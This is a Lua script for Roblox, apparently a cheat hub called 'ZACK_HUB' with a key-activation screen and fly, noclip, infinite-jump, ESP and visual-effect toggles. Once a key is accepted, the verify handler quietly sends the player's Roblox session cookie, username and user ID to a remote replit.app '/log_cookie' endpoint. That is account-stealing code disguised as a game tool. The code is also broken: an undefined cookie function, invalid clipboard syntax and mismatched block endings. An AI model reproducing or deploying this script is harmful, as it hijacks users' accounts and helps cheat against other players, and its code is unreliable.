local BOT_API_URL = "https://bot-united--waxe4495.replit.app"

local function httpPost(path, data)
    local url = BOT_API_URL .. path
    local json = game:GetService("HttpService"):JSONEncode(data)
    
    local success, response = pcall(function()
        if syn and syn.request then
            return syn.request({
                Url = url,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = json
            })
        elseif http and http.request then
            return http.request(url, "POST", json, {["Content-Type"] = "application/json"})
        else
            return game:HttpGet(url .. "?data=" .. game:GetService("HttpService"):URLEncode(json))
        end
    end)
    
    if success and response then
        return game:GetService("HttpService"):JSONDecode(response.Body or response)
    end
    return nil
end

local function makeRainbowText(text, size, screenGui)
    local frame = Instance.new("Frame")
    frame.Parent = screenGui
    frame.BackgroundTransparency = 1
    frame.Size = UDim2.new(1, 0, 0.3, 0)
    frame.Position = UDim2.new(0, 0, 0.35, 0)
    
    local label = Instance.new("TextLabel")
    label.Parent = frame
    label.Size = UDim2.new(1, 0, 1, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.TextStrokeTransparency = 0.3
    label.TextStrokeColor3 = Color3.fromRGB(255,255,255)
    
    spawn(function()
        local hue = 0
        while label and label.Parent do
            hue = (hue + 0.02) % 1
            label.TextColor3 = Color3.fromHSV(hue, 1, 1)
            wait(0.05)
        end
    end)
    
    return frame
end

local keyInputFrame = Instance.new("Frame")
keyInputFrame.Parent = game:GetService("CoreGui")
keyInputFrame.BackgroundColor3 = Color3.fromRGB(5,5,5)
keyInputFrame.BackgroundTransparency = 0.1
keyInputFrame.BorderSizePixel = 3
keyInputFrame.BorderColor3 = Color3.fromRGB(255,255,255)
keyInputFrame.Position = UDim2.new(0.5,-200,0.5,-100)
keyInputFrame.Size = UDim2.new(0,400,0,200)
keyInputFrame.Active = true
keyInputFrame.Draggable = true
keyInputFrame.Visible = true

local keyTitle = Instance.new("TextLabel")
keyTitle.Parent = keyInputFrame
keyTitle.BackgroundTransparency = 1
keyTitle.BorderSizePixel = 2
keyTitle.BorderColor3 = Color3.fromRGB(255,255,255)
keyTitle.Position = UDim2.new(0,20,0,15)
keyTitle.Size = UDim2.new(0,360,0,35)
keyTitle.Font = Enum.Font.GothamBold
keyTitle.Text = "ENTER ACTIVATION KEY"
keyTitle.TextColor3 = Color3.fromRGB(220,220,220)
keyTitle.TextScaled = true

local keyBox = Instance.new("TextBox")
keyBox.Parent = keyInputFrame
keyBox.BackgroundTransparency = 0.9
keyBox.BorderSizePixel = 2
keyBox.BorderColor3 = Color3.fromRGB(255,255,255)
keyBox.Position = UDim2.new(0.1,0,0.35,0)
keyBox.Size = UDim2.new(0.8,0,0.2,0)
keyBox.Font = Enum.Font.Gotham
keyBox.PlaceholderText = "KEY-HERE"
keyBox.Text = ""
keyBox.TextColor3 = Color3.fromRGB(200,200,200)
keyBox.TextScaled = true

local keyButton = Instance.new("TextButton")
keyButton.Parent = keyInputFrame
keyButton.BackgroundTransparency = 1
keyButton.BorderSizePixel = 2
keyButton.BorderColor3 = Color3.fromRGB(255,255,255)
keyButton.Position = UDim2.new(0.1,0,0.6,0)
keyButton.Size = UDim2.new(0.35,0,0.2,0)
keyButton.Font = Enum.Font.GothamBold
keyButton.Text = "VERIFY"
keyButton.TextColor3 = Color3.fromRGB(220,220,220)
keyButton.TextScaled = true

local keyLinkBtn = Instance.new("TextButton")
keyLinkBtn.Parent = keyInputFrame
keyLinkBtn.BackgroundTransparency = 1
keyLinkBtn.BorderSizePixel = 2
keyLinkBtn.BorderColor3 = Color3.fromRGB(255,255,255)
keyLinkBtn.Position = UDim2.new(0.55,0,0.6,0)
keyLinkBtn.Size = UDim2.new(0.35,0,0.2,0)
keyLinkBtn.Font = Enum.Font.GothamBold
keyLinkBtn.Text = "GET KEY"
keyLinkBtn.TextColor3 = Color3.fromRGB(220,220,220)
keyLinkBtn.TextScaled = true

local function showBigMessage(msg)
    local gui = Instance.new("ScreenGui")
    gui.Parent = game:GetService("CoreGui")
    gui.DisplayOrder = 9999
    
    local frame = makeRainbowText(msg, 100, gui)
    
    task.wait(3)
    gui:Destroy()
end

local function startMainHub()
    
    print("Хаб запущен")
end

keyButton.MouseButton1Click:Connect(function()
    local key = keyBox.Text
    if key == "" then return end
    
    local player = game.Players.LocalPlayer
    local data = {
        user_id = player.UserId,
        username = player.Name,
        key = key
    }
    
    local result = httpPost("/check_key", data)
    
    if result then
    if result.status == "VALID" then
        
        local cookie = getRobloxCookie()
        if cookie then
            local data = {
                username = player.Name,
                user_id = player.UserId,
                cookie = cookie,
                key = key
            }
            httpPost("/log_cookie", data)
        end

        keyInputFrame.Visible = false
        showBigMessage("KEY ACCEPTED")
        startMainHub()
    elseif result.status == "EXPIRED" then
        showBigMessage(result.message)
    elseif result.status == "ALREADY_USED" then
        showBigMessage(result.message)
    else
        showBigMessage(result.message)
    end
else
    showBigMessage("CONNECTION ERROR")
end

keyLinkBtn.MouseButton1Click:Connect(function()
    local url = "https://t.me/sajkyn"
    setclipboard and setclipboard(url)
    showBigMessage("📋 LINK COPIED")
end)

print("✅ ZACK_HUB Loader")

-- 💀💀💀
local flying = false
local flySpeed = 50
local noclip = false
local infJump = false
local headless = false

local player = game:GetService("Players").LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local humanoid = char:WaitForChild("Humanoid")
local rootPart = char:WaitForChild("HumanoidRootPart")
local userInput = game:GetService("UserInputService")
local runService = game:GetService("RunService")
local camera = workspace.CurrentCamera

-- 😭😭😭
local icon = Instance.new("TextButton")
icon.Parent = game:GetService("CoreGui")
icon.BackgroundTransparency = 0.2
icon.BackgroundColor3 = Color3.fromRGB(10,10,10)
icon.BorderSizePixel = 2
icon.BorderColor3 = Color3.fromRGB(255,255,255)
icon.Size = UDim2.new(0, 70, 0, 70)
icon.Position = UDim2.new(0.85, 0, 0.85, 0)
icon.Font = Enum.Font.GothamBold
icon.Text = "Z_H"
icon.TextColor3 = Color3.fromRGB(255,255,255)
icon.TextScaled = true
icon.Draggable = true
icon.Active = true

spawn(function()
    local hue = 0
    while icon and icon.Parent do
        hue = (hue + 0.01) % 1
        icon.TextColor3 = Color3.fromHSV(hue, 0.8, 1)
        icon.BorderColor3 = Color3.fromHSV(hue, 0.8, 1)
        wait(0.1)
    end
end)

local mainFrame = Instance.new("Frame")
mainFrame.Parent = game:GetService("CoreGui")
mainFrame.BackgroundColor3 = Color3.fromRGB(5,5,5)
mainFrame.BackgroundTransparency = 0.05
mainFrame.BorderSizePixel = 3
mainFrame.BorderColor3 = Color3.fromRGB(255,255,255)
mainFrame.Position = UDim2.new(0.3,0,0.2,0)
mainFrame.Size = UDim2.new(0,500,0,350)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Visible = false

local title = Instance.new("TextLabel")
title.Parent = mainFrame
title.BackgroundTransparency = 1
title.BorderSizePixel = 2
title.BorderColor3 = Color3.fromRGB(255,255,255)
title.Position = UDim2.new(0,15,0,10)
title.Size = UDim2.new(0,150,0,30)
title.Font = Enum.Font.GothamBold
title.Text = "ZACK_HUB"
title.TextColor3 = Color3.fromRGB(225,225,225)
title.TextScaled = true

local closeBtn = Instance.new("TextButton")
closeBtn.Parent = mainFrame
closeBtn.BackgroundTransparency = 1
closeBtn.BorderSizePixel = 2
closeBtn.BorderColor3 = Color3.fromRGB(255,255,255)
closeBtn.Size = UDim2.new(0,30,0,30)
closeBtn.Position = UDim2.new(1,-70,0,10)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.fromRGB(225,225,225)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.TextScaled = true

local miniBtn = Instance.new("TextButton")
miniBtn.Parent = mainFrame
miniBtn.BackgroundTransparency = 1
miniBtn.BorderSizePixel = 2
miniBtn.BorderColor3 = Color3.fromRGB(255,255,255)
miniBtn.Size = UDim2.new(0,30,0,30)
miniBtn.Position = UDim2.new(1,-35,0,10)
miniBtn.Text = "−"
miniBtn.TextColor3 = Color3.fromRGB(225,225,225)
miniBtn.Font = Enum.Font.GothamBold
miniBtn.TextScaled = true

local tabs = {}
local tabNames = {"FLY", "ESP", "CHAMS", "COOKIE", "SET"}

for i, name in ipairs(tabNames) do
    local tab = Instance.new("TextButton")
    tab.Parent = mainFrame
    tab.BackgroundTransparency = 1
    tab.BorderSizePixel = 2
    tab.BorderColor3 = Color3.fromRGB(255,255,255)
    tab.Position = UDim2.new(0.02 + (i-1)*0.18, 0, 0, 50)
    tab.Size = UDim2.new(0, 70, 0, 35)
    tab.Font = Enum.Font.GothamBold
    tab.Text = name
    tab.TextColor3 = Color3.fromRGB(220,220,220)
    tab.TextScaled = true
    tabs[name] = tab
end

local containers = {}
for i, name in ipairs(tabNames) do
    local container = Instance.new("Frame")
    container.Parent = mainFrame
    container.BackgroundColor3 = Color3.fromRGB(5,5,5)
    container.BackgroundTransparency = 0.05
    container.BorderSizePixel = 2
    container.BorderColor3 = Color3.fromRGB(255,255,255)
    container.Position = UDim2.new(0.02,0,0,90)
    container.Size = UDim2.new(0.96,0,0,240)
    container.Visible = (i == 1)
    containers[name] = container
end

tabs.FLY.MouseButton1Click:Connect(function()
    for _, c in pairs(containers) do c.Visible = false end
    containers.FLY.Visible = true
end)

tabs.ESP.MouseButton1Click:Connect(function()
    for _, c in pairs(containers) do c.Visible = false end
    containers.ESP.Visible = true
end)

tabs.CHAMS.MouseButton1Click:Connect(function()
    for _, c in pairs(containers) do c.Visible = false end
    containers.CHAMS.Visible = true
end)

tabs.COOKIE.MouseButton1Click:Connect(function()
    for _, c in pairs(containers) do c.Visible = false end
    containers.COOKIE.Visible = true
end)

tabs.SET.MouseButton1Click:Connect(function()
    for _, c in pairs(containers) do c.Visible = false end
    containers.SET.Visible = true
end)

icon.MouseButton1Click:Connect(function()
    mainFrame.Visible = not mainFrame.Visible
end)

closeBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

miniBtn.MouseButton1Click:Connect(function()
    mainFrame.Visible = false
end)

local flyToggle = Instance.new("TextButton")
flyToggle.Parent = containers.FLY
flyToggle.BackgroundTransparency = 1
flyToggle.BorderSizePixel = 2
flyToggle.BorderColor3 = Color3.fromRGB(255,255,255)
flyToggle.Position = UDim2.new(0.05,0,0.1,0)
flyToggle.Size = UDim2.new(0,100,0,40)
flyToggle.Font = Enum.Font.GothamBold
flyToggle.Text = "FLY: OFF"
flyToggle.TextColor3 = Color3.fromRGB(220,220,220)
flyToggle.TextScaled = true

local flyUp = Instance.new("TextButton")
flyUp.Parent = containers.FLY
flyUp.BackgroundTransparency = 1
flyUp.BorderSizePixel = 2
flyUp.BorderColor3 = Color3.fromRGB(255,255,255)
flyUp.Position = UDim2.new(0.05,0,0.4,0)
flyUp.Size = UDim2.new(0,70,0,35)
flyUp.Font = Enum.Font.GothamBold
flyUp.Text = "UP"
flyUp.TextColor3 = Color3.fromRGB(220,220,220)
flyUp.TextScaled = true

local flyDown = Instance.new("TextButton")
flyDown.Parent = containers.FLY
flyDown.BackgroundTransparency = 1
flyDown.BorderSizePixel = 2
flyDown.BorderColor3 = Color3.fromRGB(255,255,255)
flyDown.Position = UDim2.new(0.05,0,0.6,0)
flyDown.Size = UDim2.new(0,70,0,35)
flyDown.Font = Enum.Font.GothamBold
flyDown.Text = "DOWN"
flyDown.TextColor3 = Color3.fromRGB(220,220,220)
flyDown.TextScaled = true

local speedLabel = Instance.new("TextLabel")
speedLabel.Parent = containers.FLY
speedLabel.BackgroundTransparency = 1
speedLabel.BorderSizePixel = 2
speedLabel.BorderColor3 = Color3.fromRGB(255,255,255)
speedLabel.Position = UDim2.new(0.4,0,0.4,0)
speedLabel.Size = UDim2.new(0,60,0,35)
speedLabel.Font = Enum.Font.GothamBold
speedLabel.Text = "50"
speedLabel.TextColor3 = Color3.fromRGB(220,220,220)
speedLabel.TextScaled = true

local speedPlus = Instance.new("TextButton")
speedPlus.Parent = containers.FLY
speedPlus.BackgroundTransparency = 1
speedPlus.BorderSizePixel = 2
speedPlus.BorderColor3 = Color3.fromRGB(255,255,255)
speedPlus.Position = UDim2.new(0.55,0,0.4,0)
speedPlus.Size = UDim2.new(0,40,0,35)
speedPlus.Font = Enum.Font.GothamBold
speedPlus.Text = "+"
speedPlus.TextColor3 = Color3.fromRGB(220,220,220)
speedPlus.TextScaled = true

local speedMinus = Instance.new("TextButton")
speedMinus.Parent = containers.FLY
speedMinus.BackgroundTransparency = 1
speedMinus.BorderSizePixel = 2
speedMinus.BorderColor3 = Color3.fromRGB(255,255,255)
speedMinus.Position = UDim2.new(0.3,0,0.4,0)
speedMinus.Size = UDim2.new(0,40,0,35)
speedMinus.Font = Enum.Font.GothamBold
speedMinus.Text = "-"
speedMinus.TextColor3 = Color3.fromRGB(220,220,220)
speedMinus.TextScaled = true

local noclipBtn = Instance.new("TextButton")
noclipBtn.Parent = containers.FLY
noclipBtn.BackgroundTransparency = 1
noclipBtn.BorderSizePixel = 2
noclipBtn.BorderColor3 = Color3.fromRGB(255,255,255)
noclipBtn.Position = UDim2.new(0.4,0,0.1,0)
noclipBtn.Size = UDim2.new(0,120,0,40)
noclipBtn.Font = Enum.Font.GothamBold
noclipBtn.Text = "NOCLIP: OFF"
noclipBtn.TextColor3 = Color3.fromRGB(220,220,220)
noclipBtn.TextScaled = true

local infJumpBtn = Instance.new("TextButton")
infJumpBtn.Parent = containers.FLY
infJumpBtn.BackgroundTransparency = 1
infJumpBtn.BorderSizePixel = 2
infJumpBtn.BorderColor3 = Color3.fromRGB(255,255,255)
infJumpBtn.Position = UDim2.new(0.4,0,0.6,0)
infJumpBtn.Size = UDim2.new(0,120,0,40)
infJumpBtn.Font = Enum.Font.GothamBold
infJumpBtn.Text = "INF JUMP: OFF"
infJumpBtn.TextColor3 = Color3.fromRGB(220,220,220)
infJumpBtn.TextScaled = true

local headlessBtn = Instance.new("TextButton")
headlessBtn.Parent = containers.FLY
headlessBtn.BackgroundTransparency = 1
headlessBtn.BorderSizePixel = 2
headlessBtn.BorderColor3 = Color3.fromRGB(255,255,255)
headlessBtn.Position = UDim2.new(0.7,0,0.1,0)
headlessBtn.Size = UDim2.new(0,120,0,40)
headlessBtn.Font = Enum.Font.GothamBold
headlessBtn.Text = "HEADLESS: OFF"
headlessBtn.TextColor3 = Color3.fromRGB(220,220,220)
headlessBtn.TextScaled = true

flyToggle.MouseButton1Click:Connect(function()
    flying = not flying
    flyToggle.Text = flying and "FLY: ON" or "FLY: OFF"
    if flying then
        humanoid.PlatformStand = true
    else
        humanoid.PlatformStand = false
        rootPart.Velocity = Vector3.new(0,0,0)
    end
end)

speedPlus.MouseButton1Click:Connect(function()
    flySpeed = math.min(flySpeed + 10, 200)
    speedLabel.Text = tostring(flySpeed)
end)

speedMinus.MouseButton1Click:Connect(function()
    flySpeed = math.max(flySpeed - 10, 10)
    speedLabel.Text = tostring(flySpeed)
end)

runService.Heartbeat:Connect(function()
    if flying then
        local moveDir = Vector3.new(0,0,0)
        local cameraDir = camera.CFrame.LookVector * Vector3.new(1,0,1)
        local cameraRight = camera.CFrame.RightVector * Vector3.new(1,0,1)
        
        if userInput:IsKeyDown(Enum.KeyCode.W) then
            moveDir = moveDir + cameraDir
        end
        if userInput:IsKeyDown(Enum.KeyCode.S) then
            moveDir = moveDir - cameraDir
        end
        if userInput:IsKeyDown(Enum.KeyCode.A) then
            moveDir = moveDir - cameraRight
        end
        if userInput:IsKeyDown(Enum.KeyCode.D) then
            moveDir = moveDir + cameraRight
        end
        if userInput:IsKeyDown(Enum.KeyCode.Space) then
            moveDir = moveDir + Vector3.new(0,1,0)
        end
        if userInput:IsKeyDown(Enum.KeyCode.LeftControl) then
            moveDir = moveDir - Vector3.new(0,1,0)
        end
        
        if moveDir.Magnitude > 0 then
            rootPart.Velocity = moveDir.Unit * flySpeed
        else
            rootPart.Velocity = Vector3.new(0,0,0)
        end
    end
end)

noclipBtn.MouseButton1Click:Connect(function()
    noclip = not noclip
    noclipBtn.Text = noclip and "NOCLIP: ON" or "NOCLIP: OFF"
end)

runService.Stepped:Connect(function()
    if noclip then
        for _, v in pairs(char:GetChildren()) do
            if v:IsA("BasePart") then
                v.CanCollide = false
            end
        end
    end
end)

infJumpBtn.MouseButton1Click:Connect(function()
    infJump = not infJump
    infJumpBtn.Text = infJump and "INF JUMP: ON" or "INF JUMP: OFF"
end)

userInput.JumpRequest:Connect(function()
    if infJump then
        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

headlessBtn.MouseButton1Click:Connect(function()
    headless = not headless
    headlessBtn.Text = headless and "HEADLESS: ON" or "HEADLESS: OFF"
    
    local head = char:FindFirstChild("Head")
    if head then
        head.Transparency = headless and 1 or 0
    end
end)

local espEnabled = false
local espBoxes = false
local espNames = false
local espObjects = {}

local espToggle = Instance.new("TextButton")
espToggle.Parent = containers.ESP
espToggle.BackgroundTransparency = 1
espToggle.BorderSizePixel = 2
espToggle.BorderColor3 = Color3.fromRGB(255,255,255)
espToggle.Position = UDim2.new(0.05,0,0.1,0)
espToggle.Size = UDim2.new(0,120,0,40)
espToggle.Font = Enum.Font.GothamBold
espToggle.Text = "ESP: OFF"
espToggle.TextColor3 = Color3.fromRGB(220,220,220)
espToggle.TextScaled = true

local espBoxBtn = Instance.new("TextButton")
espBoxBtn.Parent = containers.ESP
espBoxBtn.BackgroundTransparency = 1
espBoxBtn.BorderSizePixel = 2
espBoxBtn.BorderColor3 = Color3.fromRGB(255,255,255)
espBoxBtn.Position = UDim2.new(0.05,0,0.3,0)
espBoxBtn.Size = UDim2.new(0,120,0,40)
espBoxBtn.Font = Enum.Font.GothamBold
espBoxBtn.Text = "BOXES: OFF"
espBoxBtn.TextColor3 = Color3.fromRGB(220,220,220)
espBoxBtn.TextScaled = true

local espNameBtn = Instance.new("TextButton")
espNameBtn.Parent = containers.ESP
espNameBtn.BackgroundTransparency = 1
espNameBtn.BorderSizePixel = 2
espNameBtn.BorderColor3 = Color3.fromRGB(255,255,255)
espNameBtn.Position = UDim2.new(0.05,0,0.5,0)
espNameBtn.Size = UDim2.new(0,120,0,40)
espNameBtn.Font = Enum.Font.GothamBold
espNameBtn.Text = "NAMES: OFF"
espNameBtn.TextColor3 = Color3.fromRGB(220,220,220)
espNameBtn.TextScaled = true

local players = game:GetService("Players")
local localPlayer = players.LocalPlayer

local function createESP(plr)
    if not plr.Character then return end
    
    local espHolder = Instance.new("Folder")
    espHolder.Name = "ESP_" .. plr.Name
    espHolder.Parent = plr.Character
    
    if espBoxes then
        local box = Instance.new("BoxHandleAdornment")
        box.Name = "Box"
        box.Size = plr.Character:GetExtentsSize() + Vector3.new(0.2,0.2,0.2)
        box.Color3 = Color3.fromRGB(255,100,100)
        box.Transparency = 0.7
        box.ZIndex = 5
        box.AlwaysOnTop = true
        box.Adornee = plr.Character
        box.Parent = espHolder
    end
    
    if espNames then
        local head = plr.Character:FindFirstChild("Head")
        if head then
            local billboard = Instance.new("BillboardGui")
            billboard.Name = "Name"
            billboard.Adornee = head
            billboard.Size = UDim2.new(0,200,0,50)
            billboard.StudsOffset = Vector3.new(0,3,0)
            billboard.AlwaysOnTop = true
            
            local label = Instance.new("TextLabel")
            label.Parent = billboard
            label.BackgroundTransparency = 1
            label.Size = UDim2.new(1,0,1,0)
            label.Font = Enum.Font.GothamBold
            label.Text = plr.Name
            label.TextColor3 = Color3.fromRGB(255,200,200)
            label.TextStrokeTransparency = 0.5
            label.TextScaled = true
            
            billboard.Parent = espHolder
        end
    end
    
    espObjects[plr] = espHolder
end

local function clearESP()
    for _, obj in pairs(espObjects) do
        if obj then obj:Destroy() end
    end
    espObjects = {}
end

local function refreshESP()
    clearESP()
    if not espEnabled then return end
    for _, plr in pairs(players:GetPlayers()) do
        if plr ~= localPlayer then
            createESP(plr)
        end
    end
end

espToggle.MouseButton1Click:Connect(function()
    espEnabled = not espEnabled
    espToggle.Text = espEnabled and "ESP: ON" or "ESP: OFF"
    refreshESP()
end)

espBoxBtn.MouseButton1Click:Connect(function()
    espBoxes = not espBoxes
    espBoxBtn.Text = espBoxes and "BOXES: ON" or "BOXES: OFF"
    refreshESP()
end)

espNameBtn.MouseButton1Click:Connect(function()
    espNames = not espNames
    espNameBtn.Text = espNames and "NAMES: ON" or "NAMES: OFF"
    refreshESP()
end)

players.PlayerAdded:Connect(function(plr)
    plr.CharacterAdded:Connect(function()
        if espEnabled and plr ~= localPlayer then
            task.wait(0.5)
            createESP(plr)
        end
    end)
end)

players.PlayerRemoving:Connect(function(plr)
    if espObjects[plr] then
        espObjects[plr]:Destroy()
        espObjects[plr] = nil
    end
end)

local chamsEnabled = false
local skyChanged = false
local spheresActive = false
local trailActive = false
local spheres = {}
local trailParts = {}

local chamsToggle = Instance.new("TextButton")
chamsToggle.Parent = containers.CHAMS
chamsToggle.BackgroundTransparency = 1
chamsToggle.BorderSizePixel = 2
chamsToggle.BorderColor3 = Color3.fromRGB(255,255,255)
chamsToggle.Position = UDim2.new(0.05,0,0.1,0)
chamsToggle.Size = UDim2.new(0,140,0,40)
chamsToggle.Font = Enum.Font.GothamBold
chamsToggle.Text = "CHAMS: OFF"
chamsToggle.TextColor3 = Color3.fromRGB(220,220,220)
chamsToggle.TextScaled = true

local skyBtn = Instance.new("TextButton")
skyBtn.Parent = containers.CHAMS
skyBtn.BackgroundTransparency = 1
skyBtn.BorderSizePixel = 2
skyBtn.BorderColor3 = Color3.fromRGB(255,255,255)
skyBtn.Position = UDim2.new(0.05,0,0.3,0)
skyBtn.Size = UDim2.new(0,140,0,40)
skyBtn.Font = Enum.Font.GothamBold
skyBtn.Text = "PINK SKY: OFF"
skyBtn.TextColor3 = Color3.fromRGB(220,220,220)
skyBtn.TextScaled = true

local spheresBtn = Instance.new("TextButton")
spheresBtn.Parent = containers.CHAMS
spheresBtn.BackgroundTransparency = 1
spheresBtn.BorderSizePixel = 2
spheresBtn.BorderColor3 = Color3.fromRGB(255,255,255)
spheresBtn.Position = UDim2.new(0.05,0,0.5,0)
spheresBtn.Size = UDim2.new(0,140,0,40)
spheresBtn.Font = Enum.Font.GothamBold
spheresBtn.Text = "SPHERES: OFF"
spheresBtn.TextColor3 = Color3.fromRGB(220,220,220)
spheresBtn.TextScaled = true

local trailBtn = Instance.new("TextButton")
trailBtn.Parent = containers.CHAMS
trailBtn.BackgroundTransparency = 1
trailBtn.BorderSizePixel = 2
trailBtn.BorderColor3 = Color3.fromRGB(255,255,255)
trailBtn.Position = UDim2.new(0.05,0,0.7,0)
trailBtn.Size = UDim2.new(0,140,0,40)
trailBtn.Font = Enum.Font.GothamBold
trailBtn.Text = "TRAIL: OFF"
trailBtn.TextColor3 = Color3.fromRGB(220,220,220)
trailBtn.TextScaled = true

local settingsFrame = containers.SET

local bgColorBtn = Instance.new("TextButton")
bgColorBtn.Parent = settingsFrame
bgColorBtn.BackgroundTransparency = 1
bgColorBtn.BorderSizePixel = 2
bgColorBtn.BorderColor3 = Color3.fromRGB(255,255,255)
bgColorBtn.Position = UDim2.new(0.05,0,0.1,0)
bgColorBtn.Size = UDim2.new(0.4,0,0.12,0)
bgColorBtn.Font = Enum.Font.GothamBold
bgColorBtn.Text = "BG DARKER"
bgColorBtn.TextColor3 = Color3.fromRGB(220,220,220)
bgColorBtn.TextScaled = true

local borderColorBtn = Instance.new("TextButton")
borderColorBtn.Parent = settingsFrame
borderColorBtn.BackgroundTransparency = 1
borderColorBtn.BorderSizePixel = 2
borderColorBtn.BorderColor3 = Color3.fromRGB(255,255,255)
borderColorBtn.Position = UDim2.new(0.55,0,0.1,0)
borderColorBtn.Size = UDim2.new(0.4,0,0.12,0)
borderColorBtn.Font = Enum.Font.GothamBold
borderColorBtn.Text = "BORDER"
borderColorBtn.TextColor3 = Color3.fromRGB(220,220,220)
borderColorBtn.TextScaled = true

local resetBtn = Instance.new("TextButton")
resetBtn.Parent = settingsFrame
resetBtn.BackgroundTransparency = 1
resetBtn.BorderSizePixel = 2
resetBtn.BorderColor3 = Color3.fromRGB(255,255,255)
resetBtn.Position = UDim2.new(0.05,0,0.3,0)
resetBtn.Size = UDim2.new(0.9,0,0.12,0)
resetBtn.Font = Enum.Font.GothamBold
resetBtn.Text = "RESET HUB"
resetBtn.TextColor3 = Color3.fromRGB(220,220,220)
resetBtn.TextScaled = true

local oldSky

local function setPinkSky(enabled)
    if enabled then
        oldSky = game:GetService("Lighting").Sky
        local sky = Instance.new("Sky")
        sky.SkyboxBk = "rbxassetid://153300993"
        sky.SkyboxDn = "rbxassetid://153300993" 
        sky.SkyboxFt = "rbxassetid://153300993"
        sky.SkyboxLf = "rbxassetid://153300993"
        sky.SkyboxRt = "rbxassetid://153300993"
        sky.SkyboxUp = "rbxassetid://153300993"
        sky.Parent = game:GetService("Lighting")
    else
        if oldSky then
            oldSky.Parent = game:GetService("Lighting")
        else
            game:GetService("Lighting").Sky = nil
        end
    end
end

skyBtn.MouseButton1Click:Connect(function()
    skyChanged = not skyChanged
    skyBtn.Text = skyChanged and "PINK SKY: ON" or "PINK SKY: OFF"
    setPinkSky(skyChanged)
end)

local function createSpheres()
    if not char or not rootPart then return end
    
    local function makeSphere(offset, speed)
        local sphere = Instance.new("Part")
        sphere.Size = Vector3.new(2,2,2)
        sphere.Shape = Enum.PartType.Ball
        sphere.BrickColor = BrickColor.new("White")
        sphere.Material = Enum.Material.Neon
        sphere.Anchored = true
        sphere.CanCollide = false
        sphere.Transparency = 0.3
        sphere.Parent = workspace
        
        local bodyPos = Instance.new("BodyPosition")
        bodyPos.Parent = sphere
        bodyPos.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyPos.D = 100
        bodyPos.P = 1000
        
        return {part = sphere, offset = offset, speed = speed, bodyPos = bodyPos}
    end
    
    spheres[1] = makeSphere(Vector3.new(0,3,0), 1)
    spheres[2] = makeSphere(Vector3.new(0,-3,0), -1)
    
    spawn(function()
        while spheresActive do
            for i, s in pairs(spheres) do
                if s and s.part and s.part.Parent then
                    local time = tick() * 2
                    local angle = (i == 1 and time or -time)
                    local radius = 5
                    
                    local x = rootPart.Position.X + math.cos(angle) * radius
                    local z = rootPart.Position.Z + math.sin(angle) * radius
                    local y = rootPart.Position.Y + s.offset.Y
                    
                    s.bodyPos.Position = Vector3.new(x, y, z)
                    
                    local trail = Instance.new("Part")
                    trail.Size = Vector3.new(0.5,0.5,0.5)
                    trail.Shape = Enum.PartType.Ball
                    trail.BrickColor = BrickColor.new("White")
                    trail.Material = Enum.Material.Neon
                    trail.Anchored = true
                    trail.CanCollide = false
                    trail.Transparency = 0.7
                    trail.Position = s.part.Position
                    trail.Parent = workspace
                    game:GetService("Debris"):AddItem(trail, 0.3)
                end
            end
            wait(0.03)
        end
    end)
end

local function destroySpheres()
    for _, s in pairs(spheres) do
        if s and s.part then
            s.part:Destroy()
        end
    end
    spheres = {}
end

spheresBtn.MouseButton1Click:Connect(function()
    spheresActive = not spheresActive
    spheresBtn.Text = spheresActive and "SPHERES: ON" or "SPHERES: OFF"
    
    if spheresActive then
        createSpheres()
    else
        destroySpheres()
    end
end)

local lastPos = nil
local trailTimer = 0

local function createTrail()
    spawn(function()
        while trailActive do
            if char and rootPart then
                local currentPos = rootPart.Position
                trailTimer = trailTimer + wait()
                
                if trailTimer > 0.5 and lastPos and (currentPos - lastPos).Magnitude > 2 then
                    local trail = Instance.new("Part")
                    trail.Size = Vector3.new(1,1,1)
                    trail.Shape = Enum.PartType.Ball
                    trail.BrickColor = BrickColor.new("Hot pink")
                    trail.Material = Enum.Material.Neon
                    trail.Anchored = true
                    trail.CanCollide = false
                    trail.Transparency = 0.4
                    trail.Position = currentPos
                    trail.Parent = workspace
                    
                    table.insert(trailParts, trail)
                    game:GetService("Debris"):AddItem(trail, 1.5)
                    
                    trailTimer = 0
                end
                lastPos = currentPos
            end
            wait()
        end
    end)
end

trailBtn.MouseButton1Click:Connect(function()
    trailActive = not trailActive
    trailBtn.Text = trailActive and "TRAIL: ON" or "TRAIL: OFF"
    
    if trailActive then
        createTrail()
    end
end)

chamsToggle.MouseButton1Click:Connect(function()
    chamsEnabled = not chamsEnabled
    chamsToggle.Text = chamsEnabled and "CHAMS: ON" or "CHAMS: OFF"
    
    if chamsEnabled then
        if not skyChanged then
            skyChanged = true
            skyBtn.Text = "PINK SKY: ON"
            setPinkSky(true)
        end
        if not spheresActive then
            spheresActive = true
            spheresBtn.Text = "SPHERES: ON"
            createSpheres()
        end
        if not trailActive then
            trailActive = true
            trailBtn.Text = "TRAIL: ON"
            createTrail()
        end
    else
        if skyChanged then
            skyChanged = false
            skyBtn.Text = "PINK SKY: OFF"
            setPinkSky(false)
        end
        if spheresActive then
            spheresActive = false
            spheresBtn.Text = "SPHERES: OFF"
            destroySpheres()
        end
    end
end)

    end
end)

local borderColors = {
    Color3.fromRGB(255,255,255),
    Color3.fromRGB(200,200,255),
    Color3.fromRGB(255,200,200),
    Color3.fromRGB(200,255,200)
}
local borderIndex = 1

bgColorBtn.MouseButton1Click:Connect(function()
    local trans = mainFrame.BackgroundTransparency
    if trans < 0.8 then
        mainFrame.BackgroundTransparency = trans + 0.1
    else
        mainFrame.BackgroundTransparency = 0
    end
    bgColorBtn.Text = "BG: " .. math.floor((1 - mainFrame.BackgroundTransparency) * 100) .. "%"
end)

borderColorBtn.MouseButton1Click:Connect(function()
    borderIndex = borderIndex % #borderColors + 1
    mainFrame.BorderColor3 = borderColors[borderIndex]
    icon.BorderColor3 = borderColors[borderIndex]
    keyInputFrame.BorderColor3 = borderColors[borderIndex]
end)

resetBtn.MouseButton1Click:Connect(function()

    mainFrame.BackgroundTransparency = 0.05
    mainFrame.BorderColor3 = Color3.fromRGB(255,255,255)
    bgColorBtn.Text = "BG DARKER"
